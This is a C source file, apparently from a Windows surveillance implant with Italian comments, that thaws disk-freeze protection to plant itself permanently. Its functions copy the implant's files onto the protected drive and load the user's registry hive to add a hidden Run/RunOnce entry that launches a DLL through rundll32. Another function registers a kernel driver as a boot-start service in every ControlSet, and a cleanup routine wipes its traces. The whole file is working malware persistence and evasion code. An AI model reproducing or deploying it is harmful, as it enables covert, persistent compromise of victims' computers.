#include <windows.h>
#include <stdio.h>
#include "H4-DLL.h"
#include "UnHookClass.h"
#include "common.h"

//extern char OLD_REGISTRY_KEY_NAME[MAX_RAND_NAME];

#define MAX_CDIR_TRY 10

typedef struct _TOKEN_PRIVILEGES_PLUS {
    DWORD PrivilegeCount;
    LUID_AND_ATTRIBUTES Privileges[2];
} TOKEN_PRIVILEGES_PLUS, *PTOKEN_PRIVILEGES_PLUS;
void SetLoadKeyPrivs()
{
	HANDLE hProc = 0, hProcToken = 0;
	TOKEN_PRIVILEGES_PLUS tp;
	LUID     luid;
	
	do {
		if (! (hProc = FNC(OpenProcess)(PROCESS_QUERY_INFORMATION, true, FNC(GetCurrentProcessId)()))) 
			break;

		if( !FNC(OpenProcessToken)(hProc, TOKEN_ALL_ACCESS, &hProcToken) ) 
			break;

		if (!FNC(LookupPrivilegeValueA) (NULL, SE_BACKUP_NAME , &luid))
			break;

		ZeroMemory (&tp, sizeof (tp));
		tp.PrivilegeCount = 2;
		tp.Privileges[0].Luid = luid;
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		
		if (!FNC(LookupPrivilegeValueA) (NULL, SE_RESTORE_NAME , &luid))
			break;

		tp.Privileges[1].Luid = luid;
		tp.Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;

		FNC(AdjustTokenPrivileges) (hProcToken, FALSE, (TOKEN_PRIVILEGES *)&tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

	} while (FALSE);

	if (hProcToken)	
		CloseHandle (hProcToken);
	if (hProc) 
		CloseHandle(hProc);
}

void FulshDrive(WCHAR drive_letter)
{
	HANDLE hFile;
	WCHAR dst_path[MAX_PATH];

	// Flusha i dati su disco
	swprintf(dst_path, L"\\\\.\\%c:", drive_letter);
	hFile = FNC(CreateFileW)(dst_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile != INVALID_HANDLE_VALUE) {
		if (!FNC(FlushFileBuffers)(hFile))
			Sleep(2000);
		Sleep(2000); 
		CloseHandle(hFile);
	} else
		Sleep(4000);
}


BOOL RegEnumSubKey(WCHAR *subkey, DWORD index, WCHAR **buffer) 
{
	BOOL ret_val = FALSE;
	WCHAR temp_buff[1024];
	DWORD size = NULL;
	*buffer = NULL;
	HKEY hreg = NULL;

	do {
		if (FNC(RegOpenKeyW)(HKEY_LOCAL_MACHINE, subkey, &hreg) != ERROR_SUCCESS)
			break;

		memset(temp_buff, 0, sizeof(temp_buff));
		if (FNC(RegEnumKeyW)(hreg, index, temp_buff, (sizeof(temp_buff)/sizeof(temp_buff[0]))-1) != ERROR_SUCCESS)
			break;

		if ( ! ( (*buffer) = (WCHAR *)calloc(wcslen(temp_buff)*2+2, sizeof(WCHAR)) ) )
			break;

		swprintf_s((*buffer), wcslen(temp_buff)+1, L"%s", temp_buff);
		ret_val = TRUE;
	} while(0);

	if (hreg)
		FNC(RegCloseKey)(hreg);

	return ret_val;
}


BOOL DFFixCore(HideDevice *pdev_unhook, unsigned char *core_name, unsigned char *core_path, unsigned char *reg_key_name, BOOL only_key)
{
	int i;
	HKEY hOpen;
	WCHAR drive_letter;
	WCHAR mounted_letter = L'!';
	WCHAR dir_path[MAX_PATH];
	WCHAR find_path[MAX_PATH];
	WIN32_FIND_DATAW FindFileDataW;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	WCHAR user_profile[MAX_PATH];
	WCHAR src_path[MAX_PATH];
	WCHAR dst_path[MAX_PATH];
	char key_value[MAX_PATH*3];

	drive_letter = (WCHAR)(core_path[0]); 
	if (!pdev_unhook->df_thaw(drive_letter, &mounted_letter))
		return FALSE;

	// Se ha fatto la chiamata ma non ha trovato una lettera
	if (mounted_letter == L'!')
		return FALSE;

	if (!only_key) {
		// Crea la directory
		swprintf(dir_path, L"%S", core_path);
		dir_path[0] = mounted_letter;

		for (i=0; i<MAX_CDIR_TRY; i++) {
			if (FNC(CreateDirectoryW)(dir_path, NULL))
				break;
			Sleep(100);
		}
		if (i == MAX_CDIR_TRY) {
			pdev_unhook->df_freeze();
			return FALSE;
		}

		// Copia tutti i file
		swprintf(find_path, L"%S\\*", core_path);
		hFind = FNC(FindFirstFileW)(find_path, &FindFileDataW);
		if (hFind == INVALID_HANDLE_VALUE) {
			FNC(RemoveDirectoryW)(dir_path);
			pdev_unhook->df_freeze();
			return FALSE;
		}
		do {
			// Salta le directory
			if (FindFileDataW.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				continue;
			swprintf(src_path, L"%S\\%s", core_path, FindFileDataW.cFileName);
			swprintf(dst_path, L"%s\\%s", dir_path, FindFileDataW.cFileName);
			FNC(CopyFileW)(src_path, dst_path, FALSE);
		} while (FNC(FindNextFileW)(hFind, &FindFileDataW) != 0);
		FNC(FindClose)(hFind);
	}
	
	// Scrive la chiave nel registry per l'avvio
	if (!FNC(GetEnvironmentVariableW)(L"USERPROFILE", user_profile, MAX_PATH))  {
		pdev_unhook->df_freeze();
		return FALSE;
	}
	// ...se si trova su un altro device, lo monta
	if (toupper(user_profile[0]) != toupper(drive_letter)) {
		FulshDrive(mounted_letter);
		pdev_unhook->df_freeze();
		mounted_letter = L'!';
		if (!pdev_unhook->df_thaw(user_profile[0], &mounted_letter))
			return FALSE;
		if (mounted_letter == L'!')
			return FALSE;
	}

	// Path a rundll32.exe
	memset(key_value, 0, sizeof(key_value));
	FNC(GetSystemDirectoryA)(key_value, sizeof(key_value));
	strcat(key_value, "\\rundll32.exe ");

	// Path alla DLL e nome funzione
	strcat(key_value, "\""); // Per sicurezza...
	strcat(key_value, (char *)core_path);
	strcat(key_value, "\\");
	strcat(key_value, (char *)core_name);
	strcat(key_value, "\""); // ...metto il path alla dll fra ""
	strcat(key_value, ",PPPFTBBP08"); 

	user_profile[0] = mounted_letter;
	swprintf(user_profile, L"%s\\NTUSER.DAT", user_profile);
	SetLoadKeyPrivs();

	if (FNC(RegLoadKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\", user_profile) != ERROR_SUCCESS) {
		pdev_unhook->df_freeze();
		return FALSE;
	}

#ifdef RUN_ONCE_KEY
	if (FNC(RegOpenKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &hOpen) != ERROR_SUCCESS &&
		FNC(RegOpenKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Runonce", &hOpen) != ERROR_SUCCESS &&
		FNC(RegCreateKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &hOpen) != ERROR_SUCCESS) {
		FNC(RegUnLoadKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\");
		pdev_unhook->df_freeze();
		return FALSE;
	}
#else
	// Cancella la chiave vecchia 
/*	if (FNC(RegOpenKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
		FNC(RegDeleteValueA) (hOpen, (char *)OLD_REGISTRY_KEY_NAME);
		FNC(RegCloseKey)(hOpen);
	}*/

	// XXX-NEWREG
	if (FNC(RegOpenKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) != ERROR_SUCCESS &&
		FNC(RegCreateKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) != ERROR_SUCCESS) {
		FNC(RegUnLoadKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\");
		pdev_unhook->df_freeze();
		return FALSE;
	}
#endif

	if (FNC(RegSetValueExA)(hOpen, (char *)reg_key_name, NULL, REG_EXPAND_SZ, (BYTE *)key_value, strlen(key_value)+1) != ERROR_SUCCESS) {
		FNC(RegCloseKey)(hOpen);
		FNC(RegUnLoadKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\");
		pdev_unhook->df_freeze();
		return FALSE;
	}
	FNC(RegCloseKey)(hOpen);
	FNC(RegUnLoadKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\");

	FulshDrive(mounted_letter);
	pdev_unhook->df_freeze();
	return TRUE;
}


BOOL DFFixDriver(HideDevice *pdev_unhook, WCHAR *drv_path)
{
	DWORD i, dwvalue;
	WCHAR drive_letter;
	WCHAR mounted_letter = L'!';
	WCHAR sys_path[MAX_PATH];
	WCHAR dst_path[MAX_PATH];
	WCHAR *drv_name;
	WCHAR *subkey;
	HKEY hreg;
	BOOL ret_val = TRUE;

	drive_letter = drv_path[0]; 
	if (!pdev_unhook->df_thaw(drive_letter, &mounted_letter))
		return FALSE;
	if (mounted_letter == L'!')
		return FALSE;
	
	// Fixa il driver
	wcscpy(dst_path, drv_path);
	dst_path[0] = mounted_letter;
	FNC(CopyFileW)(drv_path, dst_path, FALSE);

	// -- Scrive la chiave per caricare il driver all'avvio --
	if (!FNC(GetEnvironmentVariableW)(L"SYSTEMROOT", sys_path, MAX_PATH)) {
		pdev_unhook->df_freeze();
		return FALSE;
	}
	// ... se e' su un device diverso, lo monta
	if (toupper(sys_path[0]) != toupper(drive_letter)) {
		FulshDrive(mounted_letter);
		pdev_unhook->df_freeze();
		mounted_letter = L'!';
		if (!pdev_unhook->df_thaw(sys_path[0], &mounted_letter))
			return FALSE;
		if (mounted_letter == L'!')
			return FALSE;
	}
	
	if ( !(drv_name = wcsrchr(drv_path, L'\\')) ) {
		pdev_unhook->df_freeze();
		return FALSE;
	}
	drv_name++;

	swprintf(sys_path, L"%s\\system32\\config\\system", sys_path);
	sys_path[0] = mounted_letter;
	if (FNC(RegLoadKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_SYSTEM\\", sys_path) != ERROR_SUCCESS) {
		pdev_unhook->df_freeze();
		return FALSE;
	}
	for(i=0;;i++) {
		if (!RegEnumSubKey(L"CURRENT_SYSTEM\\", i, &subkey))
			break;

		// Vede se è un ControlSet
		if (_wcsnicmp(subkey, L"ControlSet", wcslen(L"ControlSet"))) {
			SAFE_FREE(subkey);
			continue;
		}

		// Scrive la chiave
		swprintf_s(sys_path, sizeof(sys_path)/sizeof(WCHAR), L"CURRENT_SYSTEM\\%s\\Services\\%s", subkey, drv_name);
		SAFE_FREE(subkey);
		if (FNC(RegCreateKeyW)(HKEY_LOCAL_MACHINE, sys_path, &hreg) == ERROR_SUCCESS) {
			dwvalue = 0;			
			if (FNC(RegSetValueExW)(hreg, L"ErrorControl", NULL, REG_DWORD, (BYTE *)&dwvalue, sizeof(dwvalue)) != ERROR_SUCCESS) {
				ret_val = FALSE;
				FNC(RegCloseKey)(hreg);
				continue;
			}
			dwvalue = 1;
			if (FNC(RegSetValueExW)(hreg, L"Start", NULL, REG_DWORD, (BYTE *)&dwvalue, sizeof(dwvalue)) != ERROR_SUCCESS) {
				ret_val = FALSE;
				FNC(RegCloseKey)(hreg);
				continue;
			}
			if (FNC(RegSetValueExW)(hreg, L"Type", NULL, REG_DWORD, (BYTE *)&dwvalue, sizeof(dwvalue)) != ERROR_SUCCESS) {
				ret_val = FALSE;
				FNC(RegCloseKey)(hreg);
				continue;
			}
			if (FNC(RegSetValueExW)(hreg, L"DisplayName", NULL, REG_SZ, (BYTE *)drv_name, (wcslen(drv_name)+1)*sizeof(WCHAR)) != ERROR_SUCCESS) {
				ret_val = FALSE;
				FNC(RegCloseKey)(hreg);
				continue;
			}
			swprintf_s(dst_path, sizeof(dst_path)/sizeof(WCHAR), L"\\??\\%s", drv_path);
			if (FNC(RegSetValueExW)(hreg, L"ImagePath", NULL, REG_SZ, (BYTE *)dst_path, (wcslen(dst_path)+1)*sizeof(WCHAR)) != ERROR_SUCCESS) {
				ret_val = FALSE;
				FNC(RegCloseKey)(hreg);
				continue;
			}
			FNC(RegCloseKey)(hreg);
		} else
			ret_val = FALSE;
	}
	FNC(RegUnLoadKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_SYSTEM\\");
	FulshDrive(mounted_letter);
	pdev_unhook->df_freeze();
	return ret_val;
}


BOOL DFFixFile(HideDevice *pdev_unhook, WCHAR *src_path)
{
	WCHAR drive_letter;
	WCHAR mounted_letter = L'!';
	WCHAR dst_path[MAX_PATH];

	drive_letter = src_path[0]; 
	if (!pdev_unhook->df_thaw(drive_letter, &mounted_letter))
		return FALSE;
	if (mounted_letter == L'!')
		return FALSE;
	
	wcscpy(dst_path, src_path);
	dst_path[0] = mounted_letter;
	FNC(CopyFileW)(src_path, dst_path, FALSE);

	FulshDrive(mounted_letter);
	pdev_unhook->df_freeze();
	return TRUE;
}


BOOL DFUninstall(HideDevice *pdev_unhook, unsigned char *core_path, unsigned char *reg_key_name)
{
	HKEY hOpen;
	WCHAR drive_letter;
	WCHAR mounted_letter = L'!';
	WCHAR dir_path[MAX_PATH];
	WIN32_FIND_DATAW FindFileDataW;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	WCHAR user_profile[MAX_PATH];
	WCHAR src_path[MAX_PATH];	

	drive_letter = (WCHAR)(core_path[0]); 
	if (!pdev_unhook->df_thaw(drive_letter, &mounted_letter))
		return FALSE;
	if (mounted_letter == L'!')
		return FALSE;

	// Cancella tutti i file
	swprintf(dir_path, L"%S\\*", core_path);
	dir_path[0] = (WCHAR)mounted_letter;
	hFind = FNC(FindFirstFileW)(dir_path, &FindFileDataW);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			// Salta le directory
			if (FindFileDataW.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				continue;
			swprintf(src_path, L"%S\\%s", core_path, FindFileDataW.cFileName);
			src_path[0] = (WCHAR)mounted_letter;
			HM_WipeFileW(src_path);
		} while (FNC(FindNextFileW)(hFind, &FindFileDataW) != 0);
		FNC(FindClose)(hFind);
	}

	// Cancella la directory
	swprintf(dir_path, L"%S", core_path);
	dir_path[0] = mounted_letter;
	FNC(RemoveDirectoryW)(dir_path);
	
	// Cancella la chiave nel registry per l'avvio
	if (!FNC(GetEnvironmentVariableW)(L"USERPROFILE", user_profile, MAX_PATH))  {
		pdev_unhook->df_freeze();
		return FALSE;
	}
	// ...se si trova su un altro device, lo monta
	if (toupper(user_profile[0]) != toupper(drive_letter)) {
		FulshDrive(mounted_letter);
		pdev_unhook->df_freeze();
		mounted_letter = L'!';
		if (!pdev_unhook->df_thaw(user_profile[0], &mounted_letter))
			return FALSE;
		if (mounted_letter == L'!')
			return FALSE;
	}
	user_profile[0] = mounted_letter;
	swprintf(user_profile, L"%s\\NTUSER.DAT", user_profile);
	SetLoadKeyPrivs();
	if (FNC(RegLoadKeyW)(HKEY_USERS, L"CURRENT_NTUSER\\", user_profile) != ERROR_SUCCESS) {
		pdev_unhook->df_freeze();
		return FALSE;
	}

#ifdef RUN_ONCE_KEY
	if (FNC(RegOpenKeyW)(HKEY_USERS, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &hOpen) == ERROR_SUCCESS) {
		FNC(RegDeleteValueA) (hOpen, (char *)reg_key_name);
		FNC(RegCloseKey)(hOpen);
	}
	if (FNC(RegOpenKeyW)(HKEY_USERS, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Runonce", &hOpen) == ERROR_SUCCESS) {
		FNC(RegDeleteValueA) (hOpen, (char *)reg_key_name);
		FNC(RegCloseKey)(hOpen);
	}
#else
	// XXX-NEWREG
	if (FNC(RegOpenKeyW)(HKEY_USERS, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
		FNC(RegDeleteValueA) (hOpen, (char *)reg_key_name);
		FNC(RegCloseKey)(hOpen);
	}
	// Cancella nel caso anche la chiave vecchia
	/*if (FNC(RegOpenKeyW)(HKEY_USERS, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
		FNC(RegDeleteValueA) (hOpen, (char *)OLD_REGISTRY_KEY_NAME);
		FNC(RegCloseKey)(hOpen);
	}*/

#endif
	FNC(RegUnLoadKeyW)(HKEY_USERS, L"CURRENT_NTUSER\\");

	FulshDrive(mounted_letter);
	pdev_unhook->df_freeze();

	return TRUE;
}
